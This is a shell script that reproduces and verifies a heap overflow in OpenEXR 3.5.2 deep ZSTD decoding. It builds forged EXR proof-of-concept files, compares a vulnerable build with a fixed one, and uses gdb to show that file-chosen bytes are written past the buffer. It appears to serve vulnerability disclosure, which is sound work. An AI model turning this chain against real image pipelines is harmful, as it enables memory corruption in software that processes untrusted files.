#!/bin/sh
# W178: one-command file-level mixed-channel chosen-byte replay.
# Deep ZSTD EXR with FLOAT first / HALF second; forged split=unpacked_size=64,
# grid total 192. The vulnerable sink copies 64 in-bounds, file-chosen bytes
# to destination offset 128 (64 bytes past the 64-byte unpacked buffer).
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-mixed evidence

# Build the generator if this tree does not have it yet (same flags as build.sh).
if [ ! -x bin-vuln-plain/gen_baseline_deep_mixed ]; then
    BUILD=build-vuln-plain
    SRC=src/openexr-3.5.2
    CORE="$BUILD/src/lib/OpenEXRCore"
    GEN="$BUILD/cmake"
    IMATH_COMPAT="$BUILD/OpenEXR_ImathIncludeCompat"
    IMATH_CONFIG="$BUILD/_deps/imath-build/config"
    IMATH_SRC="$BUILD/_deps/imath-src/src"
    OPENEXR_SRC="$SRC/src/lib"
    LIBS="$BUILD/src/lib/OpenEXRUtil/libOpenEXRUtil*.a $BUILD/src/lib/OpenEXR/libOpenEXR-3_5*.a $BUILD/src/lib/OpenEXRCore/libOpenEXRCore*.a $BUILD/src/lib/IlmThread/libIlmThread*.a $BUILD/src/lib/Iex/libIex*.a"
    IMATH_LIB=$(find "$BUILD/_deps" -name 'libImath*.a' | sort | tr '\n' ' ')
    INC="-I$CORE -I$SRC/src/lib/OpenEXRCore -I$GEN -I$IMATH_COMPAT -I$IMATH_CONFIG -I$IMATH_SRC -I$OPENEXR_SRC/OpenEXR -I$OPENEXR_SRC/Iex -I$OPENEXR_SRC/IlmThread"
    g++ -g -O1 $INC cases/gen_baseline_deep_mixed.cpp $LIBS $IMATH_LIB \
        -ldeflate -lzstd -lz -lpthread -lm \
        -o bin-vuln-plain/gen_baseline_deep_mixed
fi

bin-vuln-plain/gen_baseline_deep_mixed work-mixed/baseline_deep_mixed.exr \
    > evidence/mixed-gen.out
python3 cases/make_poc_mixed.py work-mixed/baseline_deep_mixed.exr \
    work-mixed/poc_mixed.exr 32 0x3c > evidence/mixed-forge.out
python3 cases/make_poc_mixed.py work-mixed/baseline_deep_mixed.exr \
    work-mixed/poc_mixed_5a.exr 32 0x5a > /dev/null

test "$(sha256sum work-mixed/baseline_deep_mixed.exr | cut -d' ' -f1)" = \
    9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04
test "$(sha256sum work-mixed/poc_mixed.exr | cut -d' ' -f1)" = \
    484b1c35f66e18db3e263346e100da44a199e4bdf08c0678afe113b042593a52
test "$(sha256sum work-mixed/poc_mixed_5a.exr | cut -d' ' -f1)" = \
    efb6bbd24d9b3c3165f75fe4c2da2f69f0de9ffabf8f3a6ccb6169f8a5af033b

bin-vuln-plain/guarded_harness work-mixed/baseline_deep_mixed.exr 2>&1 \
    | awk '/^BUFFERS / {gsub(/0x[0-9a-f]+/, "ADDR")} {print}' \
    > evidence/mixed-baseline.out
bin-vuln-plain/guarded_harness work-mixed/poc_mixed.exr 2>&1 \
    | awk '/^BUFFERS / {gsub(/0x[0-9a-f]+/, "ADDR")} {print}' \
    > evidence/mixed-vuln.out
bin-fixed-asan/guarded_harness work-mixed/poc_mixed.exr 2>&1 \
    | awk '/^BUFFERS / {gsub(/0x[0-9a-f]+/, "ADDR")} {print}' \
    > evidence/mixed-fixed.out

# Byte-level proof: the 8 bytes at dst+128 come from the crafted file.
RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT
for pair in '3c:poc_mixed.exr' '5a:poc_mixed_5a.exr'; do
    byte=${pair%%:*}
    file=${pair#*:}
    gdb -q -batch -ex 'break guarded_harness.c:137' \
        -ex "run work-mixed/$file" \
        -ex 'x/8bx decode.unpacked_buffer+128' \
        bin-vuln-plain/guarded_harness > "$RAW" 2>&1
    grep '^0x' "$RAW" | cut -d: -f2- > "evidence/mixed-gdb-$byte.out"
done

grep -q 'DECODE rv=0' evidence/mixed-baseline.out
grep -q 'GUARD-TOTAL post-decode changed=0' evidence/mixed-baseline.out
grep -q 'DECODE rv=31' evidence/mixed-vuln.out
grep -q 'GUARD-TOTAL post-decode changed=128' evidence/mixed-vuln.out
grep -q 'DECODE rv=23' evidence/mixed-fixed.out
[ "$(grep -o '0x3c' evidence/mixed-gdb-3c.out | wc -l)" -eq 8 ]
[ "$(grep -o '0x5a' evidence/mixed-gdb-5a.out | wc -l)" -eq 8 ]


printf 'RESULT PASS\n'
cat evidence/mixed-gdb-3c.out evidence/mixed-gdb-5a.out
sha256sum evidence/mixed-baseline.out evidence/mixed-vuln.out \
    evidence/mixed-fixed.out evidence/mixed-gdb-3c.out \
    evidence/mixed-gdb-5a.out
